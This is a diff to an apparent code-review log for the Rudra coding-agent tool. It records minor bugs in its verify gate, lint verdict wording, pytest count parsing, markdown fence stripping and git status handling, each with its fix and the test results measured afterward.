 | CR-E8 | Minor | **`DONE`** | **`source_files` hides any directory named `build`/`out`/`dist`/`target`/`coverage` at any depth.** `verify/stubs.py:168` matches `_SKIP_DIRS` against every part of the relative path, while `filesystem/tree.py:41-46` root-anchors exactly these five names with the reason spelled out (A1.29: "they silently hide real source from the agent"). **Measured** on one tree: `project_tree` lists `src/app.py`, `src/build/pipeline.py`, `src/out/handler.py`; `source_files` returns only `('src/app.py',)`. So the model is shown files the gate will never scan, and `changed_since` — which falls back to `source_files` when `before is None` (`engine.py:288`) — drops them from `files_touched` on the first task of a non-git project. <br><br>**FIXED 2026-08-21.** Fixed: `source_files` uses tree.py's split — the five ambiguous names root-anchored, the rest at any depth. Verified: `src/build/pipeline.py` and `src/out/handler.py` are now scanned, while root `build/` and `node_modules/` are still skipped. |
 | CR-E9 | Minor | **`DONE`** | **The verdict claims "all 5 stages ran clean" when advisory lint failed.** `verify/report.py:74` returns that string whenever `skipped == 0`, and `_INCONCLUSIVE` (`:31`) covers only `NOT_APPLICABLE`/`COVERED_BY` — so a lint stage with `outcome=FAILED, blocking=False` counts as clean. **Reproduced:** lint FAILED with detail "12 problems" → `verdict_line` → "passed — all 5 stages ran clean", exit 0. The module docstring's own rule ("a gate reporting success while stages were skipped is A1.57 at report level") is violated by the sentence itself, and this verdict is what `_write_log` puts at the top of `verify.log`. <br><br>**FIXED 2026-08-21.** Fixed: `verdict_line` counts non-blocking FAILED stages. Verified: advisory lint failing now reads `passed — lint (12 problems) failed (advisory)`, and a genuinely clean run still reads `passed — all 5 stages ran clean`. |
 | CR-E10 | Minor | **`DONE`** | **pytest `xfailed`/`xpassed` are matched but dropped from the total.** `testing/parse.py:61-65` builds `total = passed + failed + skipped`; `_PYTEST_PAIR` (`:19`) captures `xfailed\|xpassed` but neither is ever added. **Measured** on a real run — "1 failed, 1 passed, 1 skipped, 1 xfailed, 1 error" (5 tests) → `Counts(total=4, failed=2, skipped=1)`. Cosmetic in the detail line today, but `total` is also the input to `_collected_nothing`, so it should be right. <br><br>**FIXED 2026-08-21.** Fixed: `xpassed` adds to passed, `xfailed` to skipped (`testing/parse.py`). Verified on real pytest output: "1 failed, 1 passed, 1 skipped, 1 xfailed, 1 error" now totals **5**, was 4. |
-| CR-E11 | Minor | **`DONE`** | **Fence stripping mangles a markdown file that legitimately opens and closes with a fence, and raises on non-str content.** `middleware/fix_write_params.py:22` `_FENCE_RE = r"^```[^\n]*\n?(.*?)```\s*$"` with `re.DOTALL`, applied **always on** (D4). (a) Writing a README whose content is ` ```bash\nnpm i\n``` \n\nSome text\n\n ```js\nconst a = 1;\n``` ` silently deletes the first opening fence and the last closing fence, corrupting the file. (`tests/test_fix_write_params.py:36` deliberately asserts the greedy behaviour for the ```markdown-wrapped case; the two shapes are distinguishable by the info string and by whether the interior holds an unmatched fence.) (b) `content.strip()` at `:34-36` assumes a string — a model emitting `"content": ["a","b"]` raises `AttributeError` inside `wrap_tool_call` instead of the tool returning a correctable validation error. The sandbox branch three lines below **does** guard with `isinstance(args[key], str)`. <br><br>**2026-08-21.** **Half fixed.** The crash is fixed: `content` is only fence-stripped when it `isinstance(str)`, so a model emitting a list gets a correctable tool error instead of `AttributeError` inside `wrap_tool_call`. The greedy-fence half is **WONTFIX for now**: `tests/test_fix_write_params.py:38` asserts that behaviour deliberately for the ```markdown-wrapped case, and the two shapes are not cleanly separable without changing a documented decision. Worth revisiting with a rule keyed on the info string. |
+| CR-E11 | Minor | **`DONE`** | **Fence stripping mangles a markdown file that legitimately opens and closes with a fence, and raises on non-str content.** `middleware/fix_write_params.py:22` `_FENCE_RE = r"^```[^\n]*\n?(.*?)```\s*$"` with `re.DOTALL`, applied **always on** (D4). (a) Writing a README whose content is ` ```bash\nnpm i\n``` \n\nSome text\n\n ```js\nconst a = 1;\n``` ` silently deletes the first opening fence and the last closing fence, corrupting the file. (`tests/test_fix_write_params.py:36` deliberately asserts the greedy behaviour for the ```markdown-wrapped case; the two shapes are distinguishable by the info string and by whether the interior holds an unmatched fence.) (b) `content.strip()` at `:34-36` assumes a string — a model emitting `"content": ["a","b"]` raises `AttributeError` inside `wrap_tool_call` instead of the tool returning a correctable validation error. The sandbox branch three lines below **does** guard with `isinstance(args[key], str)`. <br><br>**2026-08-21.** **Half fixed.** The crash is fixed: `content` is only fence-stripped when it `isinstance(str)`, so a model emitting a list gets a correctable tool error instead of `AttributeError` inside `wrap_tool_call`. The greedy-fence half is **WONTFIX for now**: `tests/test_fix_write_params.py:38` asserts that behaviour deliberately for the ```markdown-wrapped case, and the two shapes are not cleanly separable without changing a documented decision. Worth revisiting with a rule keyed on the info string. <br><br>**Closed 2026-08-21 as OPEN-3.** The rule keyed on the info string shipped; `test_keeps_inner_fences_when_stripping_outer` still passes unchanged. |
 | CR-E12 | Minor | **`DONE`** | **A failed `git status` is indistinguishable from "nothing changed".** `git/core.py:194` `return _parse_status(result.stdout) if result.ok else []`. `changed_files_from_git` passes `is_repo` and gets `()` back, so `rudra verify` scans zero files and reports "passed — all 5 stages ran clean" over an unexamined tree — the exact outcome `verify/__init__.py:108-113` says it refuses for the not-a-repo case. In the loop the same `[]` makes `git_snapshot` return `{}` for both snapshots, so every attempt reads as "the coder wrote nothing". Reachable on a corrupt index, a `dubious ownership` refusal that still lets `rev-parse` through, or an ENOMEM. Fix: return `list \| None`, as `changed_files_from_git` and `git_snapshot` already do for "not a repo". <br><br>**FIXED 2026-08-21.** Fixed: `core.status` returns `None` when git fails, and all three callers treat that as "unknown" exactly as they already treat "not a repo". `tests/test_git_core.py` updated to assert the new contract with the reasoning. |
 
 ### CR-G — cli · repl · trace · mcp
@@ -639,11 +841,11 @@ warns about: *"One fact, one owner — a second copy would drift."*
 **Nothing is left `PENDING`.** The two `WONTFIX` rows each say what would
 have to be decided to reopen them.
 
-Two of the 63 are **partial**, and their rows say which half was left:
-**CR-E11** (the crash is fixed; the greedy-fence half collides with a
-deliberate test) and **CR-C6** (fixed as a side effect of CR-C5 — the
-cancel callback now fires during a run — but the approval prompt itself
-still blocks the loop inside `input()`).
+Two were **partial** when this tally was written, and both were finished
+later the same day: **CR-E11**'s greedy-fence half became OPEN-3 and
+**CR-C6**'s blocking-prompt half became OPEN-2. Their original rows below
+are left as written, each now carrying a pointer to the OPEN item that
+closed it.
 
 **Gates after the work** (measured, not assumed):
 
@@ -653,6 +855,14 @@ uv run pytest -q                  → 1734 passed, 2 skipped   (was 1696; +38 re
 .venv/bin/ruff format --check     → 258 files already formatted
 .venv/bin/mypy src/rudra          → 19 errors (unchanged from the pre-work baseline)
 .venv/bin/rudra --version         → Rudra v0.2.0
+```
+
+After OPEN-1, OPEN-3 and OPEN-2 closed later the same day:
+
+```
+uv run pytest -q                  → 1745 passed, 2 skipped
+.venv/bin/ruff check src/ tests/  → All checks passed!
+.venv/bin/ruff format --check     → 260 files already formatted
 ```
 
 Every Critical was reproduced before it was fixed and re-verified after. The
